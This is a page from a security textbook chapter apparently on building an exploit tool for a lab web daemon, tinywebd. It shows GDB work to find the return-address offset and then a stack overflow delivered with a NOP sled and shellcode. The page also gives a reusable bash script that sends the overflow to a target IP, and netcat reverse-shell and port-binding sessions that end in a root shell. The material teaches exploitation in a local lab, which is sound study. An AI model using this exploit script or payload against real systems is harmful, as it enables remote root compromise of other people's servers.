<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x631 tinywebd Exploit Tool</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part135.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part137.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark123">0x631 tinywebd Exploit Tool</a></p><p style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">For the tinyweb daemon, we want an exploit tool that allows us to experiment with the vulnerabilities. As in the development of our previous exploits, GDB is used first to figure out the details of the vulnerability, such as offsets. The offset to the return address will be the same as in the original tinyweb.c program, but a daemon program presents added challenges. The daemon call forks the process, running the rest of the program in the child process, while the parent process exits. In the output below, a breakpoint is set after the <span class="s31">daemon() </span>call, but the debugger never hits it.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1007.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g tinywebd.c reader@hacking:~/booksrc $ sudo gdb -q ./a.out</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">warning: not using untrusted file &quot;/home/reader/.gdbinit&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) list 47</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">42</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">43    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof(int)) == -1)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">44       fatal(&quot;setting socket option SO_REUSEADDR&quot;); 45</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">46     printf(&quot;Starting tiny web daemon.\n&quot;);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">47    if(daemon(1, 1) == -1) // Fork to a background daemon process.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">48      fatal(&quot;forking to daemon process&quot;); 49</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">50    signal(SIGTERM, handle_shutdown);  // Call handle_shutdown when killed.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">51     signal(SIGINT, handle_shutdown);  // Call handle_shutdown when interrupted. (gdb) break 50</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1 at 0x8048e84: file tinywebd.c, line 50. (gdb) run</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Starting program: /home/reader/booksrc/a.out Starting tiny web daemon.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Program exited normally. (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1008.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">When the program is run, it just exits. In order to debug this program, GDB needs to be told to follow the child process, as opposed to following the parent. This is done by setting <span class="s31">follow-fork-mode </span>to <span class="s31">child</span>. After this change, the debugger will follow execution into the child process, where the breakpoint can be hit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1009.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) set follow-fork-mode child (gdb) help set follow-fork-mode</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Set debugger response to a program call of fork or vfork.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">A fork or vfork creates a new process. follow-fork-mode can be:</p><p class="s31" style="padding-left: 28pt;text-indent: 0pt;line-height: 107%;text-align: left;">parent - the original process is debugged after a fork child  - the new process is debugged after a fork</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The unfollowed process will continue to run.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">By default, the debugger will follow the parent process. (gdb) run</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Starting program: /home/reader/booksrc/a.out Starting tiny web daemon.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[Switching to process 1051]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, main () at tinywebd.c:50</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">50    signal(SIGTERM, handle_shutdown);  // Call handle_shutdown when killed. (gdb) quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">The program is running. Exit anyway? (y or n) y reader@hacking:~/booksrc $ ps aux | grep a.out</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:37pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root</p></td><td style="width:74pt"><p class="s42" style="padding-left: 9pt;padding-right: 3pt;text-indent: 0pt;line-height: 9pt;text-align: center;">911 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">1636</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">416 ?</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">Ss</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">06:04</p></td><td style="width:141pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 /home/reader/booksrc/a.out</p></td></tr><tr style="height:10pt"><td style="width:37pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader</p></td><td style="width:74pt"><p class="s42" style="padding-left: 9pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">1207 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2880</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">748 pts/2</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">R+</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">06:13</p></td><td style="width:141pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 grep a.out</p></td></tr></table><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ sudo kill 911 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1010.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">It’s good to know how to debug child processes, but since we need specific stack values, it’s much cleaner and easier to attach to a running process. After killing any stray a.out processes, the tinyweb daemon is started back up and then attached to with GDB.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1011.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon..</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ps aux | grep tinywebd</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:34pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root</p></td><td style="width:77pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">25830 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">1636</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">356 ?</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">Ss</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">20:10</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 ./tinywebd</p></td></tr><tr style="height:10pt"><td style="width:34pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader</p></td><td style="width:77pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">25837 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2880</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">748 pts/1</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">R+</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">20:10</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 grep tinywebd</p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g tinywebd.c reader@hacking:~/booksrc $ sudo gdb -q—pid=25830 --symbols=./a.out</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">warning: not using untrusted file &quot;/home/reader/.gdbinit&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. Attaching to process 25830</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">/cow/home/reader/booksrc/tinywebd: No such file or directory. A program is being debugged already. Kill it? (y or n) n Program not killed.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) bt</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#0 0xb7fe77f2 in ?? () #1 0xb7f691e1 in ?? ()</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">#2 0x08048f87 in main () at tinywebd.c:68 (gdb) list 68</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">63    if (listen(sockfd, 20) == -1)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">64      fatal(&quot;listening on socket&quot;); 65</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">66    while(1) {  // Accept loop</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">67       sin_size = sizeof(struct sockaddr_in);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">68      new_sockfd = accept(sockfd, (struct sockaddr *)&amp;client_addr, &amp;sin_size);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">69      if(new_sockfd == -1)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">70       fatal(&quot;accepting connection&quot;);</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">71</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">72      handle_connection(new_sockfd, &amp;client_addr, logfd); (gdb) list handle_connection</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">77   /* This function handles the connection on the passed socket from the</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">78    * passed client address and logs to the passed FD. The connection is</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">79    * processed as a web request, and this function replies over the connected</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">80   * socket. Finally, the passed socket is closed at the end of the function.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">81   */</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">82   void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">83     unsigned char *ptr, request[500], resource[500], log_buffer[500];</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">84    int fd, length; 85</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">86     length = recv_line(sockfd, request); (gdb) break 86</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Breakpoint 1 at 0x8048fc3: file tinywebd.c, line 86. (gdb) cont</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Continuing.</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1012.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The execution pauses while the tinyweb daemon waits for a connection. Once again, a connection is made to the webserver using a browser to advance the code execution to the breakpoint.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1013.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, handle_connection (sockfd=5, client_addr_ptr=0xbffff810) at tinywebd.c:86</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">86     length = recv_line(sockfd, request); (gdb) bt</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">#0 handle_connection (sockfd=5, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86 #1 0x08048fb7 in main () at tinywebd.c:72</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">(gdb) x/x request 0xbffff5c0:   0x080484ec (gdb) x/16x request + 500</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: justify;">0xbffff7b4:   0xb7fd5ff4    0xb8000ce0    0x00000000    0xbffff848 0xbffff7c4:   0xb7ff9300    0xb7fd5ff4    0xbffff7e0    0xb7f691c0 0xbffff7d4:   0xb7fd5ff4    0xbffff848    0x08048fb7    0x00000005 0xbffff7e4:   0xbffff810    0x00000003    0xbffff838    0x00000004 (gdb) x/x 0xbffff7d4 + 8</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xbffff7dc:  0x08048fb7</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p /x 0xbffff7dc - 0xbffff5c0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 0x21c</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0xbffff7dc - 0xbffff5c0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$2 = 540</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p /x 0xbffff5c0 + 100</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$3 = 0xbffff624 (gdb) quit</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">The program is running. Quit anyway (and detach it)? (y or n) y Detaching from program: , process 25830 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1014.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The debugger shows that the request buffer starts at <span class="s31">0xbffff5c0 </span>and the stored return address is at <span class="s31">0xbffff7dc</span>, which means the offset is 540 bytes. The safest place for the shellcode is near the middle of the 500-byte request buffer. In the output below, an exploit buffer is created that sandwiches the shellcode between a NOP sled and the return address repeated 32 times. The 128 bytes of repeated return address keep the shellcode out of unsafe stack memory, which might be overwritten. There are also unsafe bytes near the beginning of the exploit buffer, which will be overwritten during null termina- tion. To keep the shellcode out of this range, a 100-byte NOP sled is put in front of it. This leaves a safe landing zone for the execution pointer, with the shellcode at <span class="s31">0xbffff624</span>. The following output exploits the vulnerability using the loopback shellcode.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1015.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ wc -c loopback_shell 83 loopback_shell</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ echo $((540+4 - (32*4) - 83)) 333</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ nc -l -p 31337 &amp;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[1] 9835</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ jobs</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[1]+ Running         nc -l -p 31337 &amp;</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ (perl -e &#39;print &quot;\x90&quot;x333&#39;; cat loopback_shell; perl -e &#39;print &quot;\ x24\xf6\xff\xbf&quot;x32 . &quot;\r\n&quot;&#39;) | nc -w 1 -v 127.0.0.1 80</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">localhost [127.0.0.1] 80 (www) open reader@hacking:~/booksrc $ fg</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">nc -l -p 31337 whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">root</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1016.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Since the offset to the return address is 540 bytes, 544 bytes are needed to overwrite the address. With the loopback shellcode at 83 bytes and the overwritten return address repeated 32 times, simple arithmetic shows that the NOP sled needs to be 333 bytes to align everything in the exploit buffer properly. netcat is run in listen mode with an ampersand (<span class="s31">&amp;</span>) appended to the end, which sends the process to the background. This listens for the con- nection back from the shellcode and can be resumed later with the command <span class="s31">fg </span>(foreground). On the LiveCD, the at (<span class="s31">@</span>) symbol in the command prompt will change color if there are background jobs, which can also be listed with the <span class="s31">jobs </span>command. When the exploit buffer is piped into netcat, the <span class="s31">-w </span>option is used to tell it to time out after one second. Afterward, the backgrounded netcat process that received the connectback shell can be resumed.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">All this works fine, but if a shellcode of different size is used, the NOP sled size must be recalculated. All these repetitive steps can be put into a single shell script.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The BASH shell allows for simple control structures. The <span class="s31">if </span>statement at the beginning of this script is just for error checking and displaying the usage</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">message. Shell variables are used for the offset and overwrite return address, so they can be easily changed for a different target. The shellcode used for the exploit is passed as a command-line argument, which makes this a useful tool for trying out a variety of shellcodes.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">xtool_tinywebd.sh</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1017.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">#!/bin/sh</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"># A tool for exploiting tinywebd</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 106%;text-align: left;">if [ -z &quot;$2&quot; ]; then # If argument 2 is blank echo &quot;Usage: $0 &lt;shellcode file&gt; &lt;target IP&gt;&quot; exit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">fi OFFSET=540</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">RETADDR=&quot;\x24\xf6\xff\xbf&quot; # At +100 bytes from buffer @ 0xbffff5c0 echo &quot;target IP: $2&quot;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">SIZE=`wc -c $1 | cut -f1 -d &#39; &#39;` echo &quot;shellcode: $1 ($SIZE bytes)&quot;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE))</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">echo &quot;[NOP ($ALIGNED_SLED_SIZE bytes)] [shellcode ($SIZE bytes)] [ret addr ($((4*32)) bytes)]&quot;</p><p class="s31" style="padding-left: 95pt;text-indent: -4pt;line-height: 107%;text-align: left;">( perl -e &quot;print \&quot;\x90\&quot;x$ALIGNED_SLED_SIZE&quot;; cat $1;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">perl -e &quot;print \&quot;$RETADDR\&quot;x32 . \&quot;\r\n\&quot;&quot;;) | nc -w 1 -v $2 80</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1018.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Notice that this script repeats the return address an additional thirty-third time, but it uses 128 bytes (32 × 4) for calculating the sled size. This puts an extra copy of the return address past where the offset dictates. Sometimes different compiler options will move the return address around a little bit, so this makes the exploit more reliable. The output below shows this tool being used to exploit the tinyweb daemon once again, but with the port-binding shellcode.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1019.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./xtool_tinywebd.sh portbinding_shellcode 127.0.0.1 target IP: 127.0.0.1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">shellcode: portbinding_shellcode (92 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[NOP (324 bytes)] [shellcode (92 bytes)] [ret addr (128 bytes)] localhost [127.0.0.1] 80 (www) open</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">localhost [127.0.0.1] 31337 (?) open whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">root</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1020.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">Now that the attacking side is armed with an exploit script, consider what happens when it’s used. If you were the administrator of the server running the tinyweb daemon, what would be the first signs that you were hacked?</p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part137.htm">0x640 Log Files</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part135.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part137.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
